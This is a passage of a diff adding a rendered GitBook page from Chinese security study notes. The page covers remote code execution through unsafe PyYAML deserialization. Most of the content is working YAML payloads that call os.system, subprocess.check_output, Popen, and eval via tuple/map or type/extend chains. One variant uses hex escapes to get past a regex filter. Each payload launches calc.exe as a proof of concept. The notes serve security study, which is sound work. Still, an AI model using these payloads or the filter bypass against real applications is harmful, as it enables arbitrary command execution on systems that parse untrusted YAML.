+<pre><code>!!python/object/new:type
+  args: [&quot;z&quot;, !!python/tuple [], {&quot;extend&quot;: !!python/name:eval }]
+</code></pre><p>With this we can put our commands to <code>listitems</code>, and the constructor will call <code>instance.extend(listitems)</code>, thus finish our RCE exploit. </p>
+<pre><code>!!python/object/new:type
+  args: [&quot;z&quot;, !!python/tuple [], {&quot;extend&quot;: !!python/name:eval }]
+  listitems: &quot;\x5f\x5fimport\x5f\x5f(&apos;os&apos;)\x2esystem(&apos;calc\x2eexe&apos;)&quot;
+</code></pre><p>We changed <code>_</code> to <code>\x5f</code> and <code>.</code> to <code>\x2e</code> to bypass the regex limitation </p>
+<h3 id="tuplemap">tuple&amp;map</h3>
+<p>This is essentially the python code <code>tuple(map(eval, &quot;PAYLOAD&quot;))</code>, and this works as <code>map</code> and <code>tuple</code> are both class constructor (so it doesnt use any function as apply calls) </p>
+<pre><code>!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ &apos;__import__(&quot;os&quot;).system(&quot;calc.exe&quot;)&apos; ]]]
+</code></pre><p>or like this</p>
+<blockquote>
+<p>&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x77ED;&#x6A2A;&#x7EBF;&#x52A0;&#x4E00;&#x4E2A;&#x7A7A;&#x683C;&#x4EE3;&#x8868;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#x9879; </p>
+</blockquote>
+<pre><code>!!python/object/new:tuple
+- !!python/object/new:map
+ - !!python/name:eval
+ - [ &apos;__import__(&quot;os&quot;).system(&quot;calc.exe&quot;)&apos; ]
+</code></pre><p>oor like this</p>
+<pre><code>!!python/object/new:tuple
+- !!python/object/new:map
+ - !!python/name:eval
+ - 
+  - &apos;__import__(&quot;os&quot;).system(&quot;calc.exe&quot;)&apos;
+</code></pre><h3 id="other-rce">other RCE</h3>
+<p>&#x76F4;&#x63A5;&#x4FEE;&#x6539;yml&#x6587;&#x4EF6;&#x4E3A;&#xFF1A;</p>
+<pre><code>!!python/object:os.system [&quot;calc.exe&quot;]
+</code></pre><p>&#x518D;&#x8FD0;&#x884C;&#xFF0C;&#x5931;&#x8D25;&#xFF08;&#x663E;&#x793A;&#x53C2;&#x6570;&#x672A;&#x4F20;&#x9012;&#xFF1A;TypeError: system() takes exactly 1 argument (0 given)&#xFF09;&#xFF0C;&#x5C1D;&#x8BD5;&#x67E5;&#x770B;&#x6E90;&#x7801;&#x3001;&#x5E76;&#x53D8;&#x6362;yml&#x6587;&#x4EF6;&#x4E2D;&#x8BED;&#x53E5;&#x683C;&#x5F0F;&#xFF0C;&#x5747;&#x672A;&#x6210;&#x529F;&#xFF01;&#xFF08;&#x7591;&#x96BE;&#x70B9;&#xFF09;&#x3002;</p>
+<p>&#x4FEE;&#x6539;&#x4E3A;&#x4EE5;&#x4E0B;2&#x79CD;&#x5747;&#x6210;&#x529F;&#xFF0C;&#x901A;&#x8FC7;&#x6E90;&#x7801;&#x5F97;&#x77E5;&#xFF0C;new&#x5176;&#x5B9E;&#x662F;&#x8C03;&#x7528;&#x4E86;apply&#xFF0C;&#x4ED6;&#x4EEC;&#x7684;&#x4E0D;&#x540C;&#x7684;&#x5730;&#x65B9;&#x662F;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x5927;&#x81F4;&#x8BA4;&#x4E3A;&#x5B83;&#x4EEC;&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;</p>
+<pre><code>!!python/object/apply:os.system [&quot;calc.exe&quot;]
+!!python/object/new:os.system [&quot;calc.exe&quot;]
+</code></pre><p>&#x7136;&#x540E;&#x5C31;&#x662F;&#x5404;&#x79CD;&#x7EC4;&#x5408;&#x7684;payload</p>
+<pre><code>!!python/object/apply:os.system
+ - &quot;calc.exe&quot;
+
+!!python/object/new:os.system
+ - &quot;calc.exe&quot;
+</code></pre><p>&#x8FD8;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x5176;&#x5B83;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x51FD;&#x6570;</p>
+<pre><code>!!python/object/apply:subprocess.check_output [&quot;calc.exe&quot;]
+!!python/object/apply:subprocess.check_output [[&quot;calc.exe&quot;]]
+!!python/object/apply:subprocess.check_output [[calc.exe]]
+!!python/object/new:subprocess.check_output [&quot;calc.exe&quot;]
+!!python/object/new:subprocess.check_output [[&quot;calc.exe&quot;]]
+!!python/object/new:subprocess.check_output [[calc.exe]]
+!!python/object/apply:subprocess.Popen [calc.exe]
+</code></pre>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="CommonsCollections逐步分析.html" class="navigation navigation-prev " aria-label="Previous page: CommonsCollections逐步分析">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="ROME逐步分析.html" class="navigation navigation-next " aria-label="Next page: ROME逐步分析">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Java XML反序列化漏洞","level":"1.3","depth":1,"next":{"title":"ROME逐步分析","level":"1.4","depth":1,"path":"javanote/ROME逐步分析.md","ref":"javanote/ROME逐步分析.md","articles":[]},"previous":{"title":"CommonsCollections逐步分析","level":"1.2","depth":1,"path":"javanote/CommonsCollections逐步分析.md","ref":"javanote/CommonsCollections逐步分析.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr"],"pluginsConfig":{"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"javanote/Java XML反序列化漏洞.md","mtime":"2022-02-09T13:56:22.118Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-07-03T05:16:54.483Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
